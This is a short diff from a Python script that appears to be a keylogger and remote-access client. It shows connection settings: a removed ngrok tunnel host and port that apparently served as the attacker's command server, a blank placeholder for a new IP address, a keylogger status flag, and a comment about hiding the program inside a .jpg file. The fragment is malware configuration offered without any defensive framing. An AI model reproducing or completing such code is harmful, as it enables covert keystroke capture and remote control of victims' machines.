@@ -10,10 +10,10 @@ import time
 #   Hide inside .jpg    https://www.youtube.com/watch?v=jcLYtfNhAMQ 
 
 HEADER = 64
-PORT = 11819
+PORT = 4321
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = "!DISCONNECT"
-SERVER = '4.tcp.eu.ngrok.io'
+SERVER =                                    #Enter IP address
 ADDR = (SERVER, PORT)
 keylogger_status = False
 connected = True
